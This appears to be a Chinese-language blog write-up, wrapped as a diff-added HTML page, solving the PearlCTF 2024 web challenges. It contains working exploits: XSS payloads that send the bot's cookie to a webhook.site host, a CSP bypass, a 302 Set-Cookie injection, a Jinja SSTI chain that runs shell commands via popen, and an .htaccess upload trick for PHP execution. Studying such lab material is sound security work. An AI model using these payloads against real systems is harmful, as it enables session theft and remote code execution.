@@ -1,0 +1,587 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[PearlCTF2024]WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[PearlCTF2024]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="我是老馋
+learn HTTP
+XSS三连击
+题目描述
+题目给了源码，这个应用里面有两个服务分别是5000端口运行的nodejs，以及5001端口运行的golong，服务通过nginx代理出来。
+server {
+    listen 60..." />
+    <meta name="keywords" content="XSS,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [PearlCTF2024]WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-13
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/hA1lnMsJD/" class="post-tag">
+                  # XSS
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/pearlctf2024web-wp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>我是老馋</p>
+<h1 id="learn-http">learn HTTP</h1>
+<p>XSS三连击</p>
+<h2 id="题目描述">题目描述</h2>
+<p>题目给了源码，这个应用里面有两个服务分别是5000端口运行的nodejs，以及5001端口运行的golong，服务通过nginx代理出来。</p>
+<pre><code>server {
+    listen 6000;
+    listen [::]:6000;
+
+    server_name pearlctf.in;
+
+    location / {
+	    proxy_pass http://localhost:5000/;
+    }
+    
+    location /resp {
+    	proxy_pass http://localhost:5001/resp;
+    }
+}
+</code></pre>
+<p><code>/resp</code>路由接受一个body参数，它会将body作为整个响应内容（响应头+响应体）返回给客户</p>
+<pre><code class="language-go">func processClient(connection net.Conn) {
+	buffer := make([]byte, 1024)
+	mLen, err := connection.Read(buffer)
+	if err != nil {
+		fmt.Println(&quot;Error reading:&quot;, err.Error())
+	}
+	raw_http_req := strings.Split(string(buffer[:mLen]), &quot;\r\n&quot;)[0]
+	splitted_req := strings.Split(raw_http_req, &quot; &quot;)
+
+	if splitted_req[0] != &quot;GET&quot; {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 405 Method Not Allowed\r\n\r\nCan only GET&quot;))
+		connection.Close()
+		return
+	}
+
+	parsed, err := url.Parse(splitted_req[1])
+	if err != nil {
+		fmt.Println(&quot;Error parsing: &quot;, err.Error())
+	}
+
+	path := parsed.Path
+
+	if path != &quot;/resp&quot; {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 404 Not Found\r\n\r\nNot Found&quot;))
+		connection.Close()
+		return
+	}
+	
+	args, err := url.ParseQuery(parsed.RawQuery)
+
+	if err != nil {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 500 Internal Server Error\r\n\r\nError&quot;))
+		connection.Close()
+		return
+	}
+
+	body, ok := args[&quot;body&quot;]
+
+	if !ok {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
+		connection.Close()
+		return
+	}
+
+	_, err = connection.Write([]byte(body[0]))
+	connection.Close()
+}
+</code></pre>
+<p>nodejs服务的<code>/check</code>同样接受一个body参数，它会对其值进行url编码，然后作为<code>/resp</code>的参数组装让bot.js访问</p>
+<pre><code class="language-javascript">const genToken = () =&gt; {
+    var token = jwt.sign({ id: 1 }, process.env.SECRET);
+    return token
+}
+
+app.post(&quot;/check&quot;, (req, res) =&gt; {
+    try {
+        let req_body = req.body.body
+        
+        if (req_body == undefined) {
+            return res.status(200).send(&quot;Body is not provided&quot;)
+        }
+
+        let to_req = `http://localhost:5001/resp?body=${encodeURIComponent(req_body)}`
+
+        childProcess.spawn('node', ['./bot.js', JSON.stringify({
+            url: to_req,
+            token: genToken()
+        })]);
+
+        return res.status(200).send(&quot;Admin will check!&quot;)
+    } catch (e) {
+        console.log(e)
+        return res.status(500).send(&quot;Internal Server Error&quot;)
+    }
+})
+</code></pre>
+<p>其中bot.js会用chromium对目标进行访问</p>
+<pre><code class="language-javascript">const puppeteer = require('puppeteer')
+
+async function visit(obj){
+	let browser;
+
+	let url = obj['url'];
+	let token = obj['token'];
+
+	if(!/^https?:\/\//.test(url)){
+		return;
+	}
+
+	try{
+		browser = await puppeteer.launch({
+            headless: true,
+            executablePath: '/usr/bin/chromium-browser',
+            args: [
+            '--no-sandbox',
+            '--headless',
+            '--disable-gpu',
+            '--disable-dev-shm-usage'
+            ]
+        });
+
+		let page = await browser.newPage();
+		await page.setCookie({
+			name: 'token',
+			value: token,
+			domain: 'localhost',
+			httpOnly: false,
+			secure: true,
+			sameSite: 'None'
+		});
+		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 3000 });
+		await new Promise(r=&gt;setTimeout(r,10000));
+	}catch(e){ console.log(e) }
+	try{await browser.close();}catch(e){}
+	process.exit(0)
+}
+
+visit(JSON.parse(process.argv[2]))
+</code></pre>
+<p>这题要get flag需要一个<code>id=2</code>的jwt，来访问<code>/flag</code></p>
+<pre><code class="language-javascript">app.get(&quot;/flag&quot;, (req, res) =&gt; {
+    let token = req.cookies.token
+    try {
+        var decoded = jwt.verify(token, process.env.SECRET)
+        if (decoded.id != 2) {
+            return res.status(200).send(&quot;You are not verified&quot;)
+        }
+
+        return res.status(200).send(process.env.FLAG)
+    } catch {
+        return res.status(200).send(&quot;You are not verified&quot;)
+    }
+})
+</code></pre>
+<p>在对整个流程分析后可以知道，解题的方法只有拿到bot.js请求时用<code>genToken()</code>生成在cookie中的token，然后破解密钥伪造签名。</p>
+<h2 id="base">base</h2>
+<p>自定义的响应内容可以使用js，chromium也会正常加载js。所以让bot.js访问<code>/resp</code>获得的响应内容如下即可</p>
+<pre><code class="language-javascript">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 121
+
+&lt;script&gt;
+fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`,{method: 'GET'});
+&lt;/script&gt;
+</code></pre>
+<p>Ps.这里有个要注意的点，bot.js在设置cookie时有个选项<code>secure: true</code>，它的意思是只允许cookie以https传输（拿自己vps用http试了好久都没注意到😭不过也因此知道了<code>webhook.site</code>这个平台👏）。</p>
+<p>编写脚本</p>
+<pre><code class="language-python">import requests
+
+def build(p):
+    return f&quot;HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;
+
+webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
+body = f&quot;&quot;&quot;&lt;script&gt;
+fetch(`{webhook}${{document.cookie}}`,{{method: 'GET'}});
+&lt;/script&gt;&quot;&quot;&quot;
+
+payload = build(body)
+# print(payload)
+
+url = &quot;https://learn-http.ctf.pearlctf.in/check&quot;
+data = {&quot;body&quot;: payload}
+response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
+print(response.text)
+</code></pre>
+<p>拿到token解密（要用密码本）、修改id、访问/flag</p>
+<pre><code class="language-shell">python jwt_tool.py &lt;jwt&gt; -C -d &lt;path&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1710266513442.png" alt="" loading="lazy"></figure>
+<h2 id="better">better</h2>
+<p>这一难度修只改了<code>/resp</code>的逻辑</p>
+<pre><code class="language-go">body, ok := args[&quot;body&quot;]
+
+if !ok {
+    _, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
+    connection.Close()
+    return
+}
+
+splitted_resp := strings.Split(body[0], &quot;\r\n\r\n&quot;)
+// 在响应头顶部插入Content-Security-Policy: script-src 'self'
+new_header := strings.Join([]string{splitted_resp[0], &quot;Content-Security-Policy: script-src 'self'&quot;}, &quot;\r\n&quot;)
+
+final_body := strings.Join([]string{new_header, splitted_resp[1]}, &quot;\r\n\r\n&quot;)
+
+_, err = connection.Write([]byte(final_body))
+connection.Close()
+</code></pre>
+<p>按理来说，CSP只限制了内容的加载是同源的，对于一个响应中的js代码不影响才对。比如下面这个代码，即使加了CSP，但script中的代码依然会执行，请求还是会发送出去。</p>
+<pre><code class="language-php">&lt;?php
+    if (!isset($_COOKIE['skky'])) {
+        setcookie('skky',md5(rand(0,1000)));
+    }
+    header(&quot;Content-Security-Policy: script-src 'self';&quot;);
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;CSP Test&lt;/title&gt;
+    &lt;script&gt;
+      fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`, {method: 'GET'});
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;CSP-safe&lt;/h2&gt;
+&lt;/body&gt;
+
+</code></pre>
+<p>但这里可能是不同浏览器对CSP策略不同，在使用bot.js的chromium访问的时候，这个webhook的请求是发不出去的。虽然把原因推到浏览器上感觉怪怪的，不过这里我也找不到更合适的解释了。</p>
+<pre><code class="language-python">import subprocess
+import requests
+
+
+def run_command(cmd):
+    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    if result.stderr:
+        return f&quot;Error: {result.stderr}&quot;
+    else:
+        return result.stdout
+
+
+# 使用题目的docker进行测试
+url = &quot;http://172.22.107.50:8888/xss/&quot;
+command = ['docker', 'run', '--rm', '--net=host', 'xss_bot', '/usr/local/bin/node', '/home/app/bot.js', f'{{&quot;url&quot;:&quot;{url}&quot;, &quot;token&quot;:&quot;skky&quot;}}']
+output = run_command(command)
+print(output)
+</code></pre>
+<p>Anyway，既然要同源加载一个脚本的话，那我们就可以利用它内部的<code>http://localhost:5001/resp</code>来做。首先让bot.js访问得到类似下面的内容</p>
+<pre><code class="language-javascript">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 60
+
+&lt;script src=&quot;http://localhost:5001/resp?body=xxxx&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>这里的<code>src</code>引入的脚本就是同源的。接着构造这个url的body部分，在它的响应中执行js代码</p>
+<pre><code class="language-javascript">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 102
+
+fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`,{method: 'GET'});
+</code></pre>
+<p>利用脚本如下</p>
+<pre><code class="language-javascript">import urllib.parse
+import requests
+
+
+def build(p):
+    return f&quot;HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;
+
+
+webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
+body_2 = f&quot;&quot;&quot;fetch(`{webhook}${{document.cookie}}`,{{method: 'GET'}});&quot;&quot;&quot;
+# print(build(body_2))
+src = f&quot;http://localhost:5001/resp?body={urllib.parse.quote(build(body_2))}&quot;
+
+body_1 = f&quot;&lt;script src=\&quot;{src}\&quot;&gt;&lt;/script&gt;&quot;
+payload = build(body_1)
+# print(payload)
+
+url = &quot;https://v1-learn-http.ctf.pearlctf.in/check&quot;
+data = {&quot;body&quot;: payload}
+response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
+print(response.text)
+</code></pre>
+<h2 id="final">final</h2>
+<p>最后难度首先修改了响应逻辑，去除了响应体中所有的尖括号<code>&lt;``&gt;</code>。</p>
+<pre><code class="language-go">body, ok := args[&quot;body&quot;]
+
+if !ok {
+    _, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
+    connection.Close()
+    return
+}
+
+splitted_resp := strings.Split(body[0], &quot;\r\n\r\n&quot;)
+
+sanitized_body := strings.Replace(splitted_resp[1], &quot;&lt;&quot;, &quot;&quot;, -1)
+sanitized_body = strings.Replace(sanitized_body, &quot;&gt;&quot;, &quot;&quot;, -1)
+
+final := strings.Join([]string{splitted_resp[0], sanitized_body}, &quot;\r\n\r\n&quot;)
+
+_, err = connection.Write([]byte(final))
+connection.Close()
+</code></pre>
+<p>同时修改了nodejs的路由</p>
+<pre><code class="language-javascript">app.get(&quot;/&quot;, (req, res) =&gt; {
+    res.sendFile(path.join(__dirname, &quot;templates/index.html&quot;))
+})
+
+app.get(&quot;/learn&quot;, (req, res) =&gt; {
+    res.status(200).sendFile(path.join(__dirname, &quot;templates/learn.html&quot;))
+})
+</code></pre>
+<p>现在虽然无法在<code>/resp</code>中执行js了，但新增的路由<code>/learn</code>存在XSS漏洞</p>
+<pre><code class="language-javascript">function getCookie(name) {
+    var nameEQ = name + &quot;=&quot;;
+    var ca = document.cookie.split(';');
+    for(var i=0;i &lt; ca.length;i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1,c.length);
+        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
+
+document.getElementById(&quot;greet&quot;).innerHTML = `Hello, ${getCookie(&quot;name&quot;)}`
+</code></pre>
+<p><code>templates/learn.html</code>会获取请求中cookie，并且未做任何处理输出在页面上。因为这部分的代码是在页面加载后执行的，所以cookie如果设置为类似<code>&lt;script&gt;alert&lt;/script&gt;</code>并不会执行。<br>
+<img src="https://skyblu3519.github.io/post-images/1710266528322.png" alt="" loading="lazy"></p>
+<p>可以用<code>img</code>标签的<code>onerror</code>事件触发，类似<code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code>。</p>
+<p>对于bot.js，虽然无法让它直接访问<code>/learn</code>，但是可以让<code>/resp</code>返回一个302跳转</p>
+<pre><code class="language-javascript">HTTP/1.1 302 Found
+Location: http://localhost:5000/learn
+Set-Cookie: name=&lt;img src=x onerror=&quot;fetch('https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/'+document.cookie)&quot;/&gt;
+Content-Length: 0
+</code></pre>
+<p>利用脚本</p>
+<pre><code class="language-python">import urllib.parse
+import requests
+
+
+def build(p):
+    webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
+    onerror = f&quot;fetch('{webhook}'+document.cookie)&quot;
+    cookie = f&quot;&lt;img src=x onerror=\&quot;{onerror}\&quot;/&gt;&quot;
+    return f&quot;HTTP/1.1 302 Found\r\nLocation: http://localhost:5000/learn\r\nSet-Cookie: name={cookie}\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;
+
+
+payload = build('')
+# print(payload)
+
+data = {&quot;body&quot;: payload}
+url = &quot;https://v2-learn-http.ctf.pearlctf.in/check&quot;
+response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
+print(response.text)
+</code></pre>
+<h1 id="i-am-a-web-noob">I am a web-noob</h1>
+<p>user处存在ssti</p>
+<p>过滤了双花括号（{{）、中括号（[）、下划线（_）、一些字符串（&quot;open&quot;、&quot;-&quot;......）</p>
+<p>使用控制语句<code>{% print() %}</code>执行+输出结果，<code>|attr(request.args.a)</code>访问对象属性。</p>
+<p>构造payload获取可以用的类，这个执行结果等价于：<code>''.__class__.__base__.__subclasses__()[154]</code></p>
+<pre><code>?user={%print(&quot;&quot;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(154))%}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1710266546021.png" alt="" loading="lazy"></figure>
+<p>使用popen执行命令读取flag，这里要注意一个括号的位置，相当于<code>(os.popen(cmd)).read()</code></p>
+<pre><code>?user={%print((&quot;&quot;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(154)|attr(request.args.e)|attr(request.args.f)|attr(request.args.d)(request.args.g)(request.args.rce)).read())%}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;rce=cat /app/flag.txt
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1710266559310.png" alt="" loading="lazy"></figure>
+<h1 id="rabbithole">rabbithole</h1>
+<p>🐰<br>
+<img src="https://skyblu3519.github.io/post-images/1710266614161.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1710266619923.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1710266624772.png" alt="" loading="lazy"></p>
+<h1 id="uploader">uploader</h1>
+<p>文件上传对内容做了详细的检查，但是后缀名并没有。</p>
+<p>上传base64编码后的php命令执行代码<br>
+<img src="https://skyblu3519.github.io/post-images/1710266655041.png" alt="" loading="lazy"></p>
+<p>上传<code>.htaccess</code>，使用<code>\</code>+换行绕过内容检查（如果愿意可以在每一个字符后都加上，这样依然可以解析），上传的<code>.htaccess</code>内容为：</p>
+<pre><code># 开启PHP解析引擎
+php_flag engine on
+# 需要绝对路径，因为inclulde的当前路径为/usr/local/lib/php
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/uploads/10.80.1.9/26398c9deb8c36cb3de78baec7da7f4f1be1438aad2876be79d21e9592d9aea3.php&quot;
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/1710266664944.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1710266733221.png" alt="" loading="lazy"><br>
+访问上传的php文件，使用命令查找flag.txt<br>
+<img src="https://skyblu3519.github.io/post-images/1710266697043.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#learn-http">learn HTTP</a>
+<ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0">题目描述</a></li>
+<li><a href="#base">base</a></li>
+<li><a href="#better">better</a></li>
+<li><a href="#final">final</a></li>
+</ul>
+</li>
+<li><a href="#i-am-a-web-noob">I am a web-noob</a></li>
+<li><a href="#rabbithole">rabbithole</a></li>
+<li><a href="#uploader">uploader</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/vishwactf2024web-wp/">
+              <h3 class="post-title">
+                [vishwactf2024]WEB WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
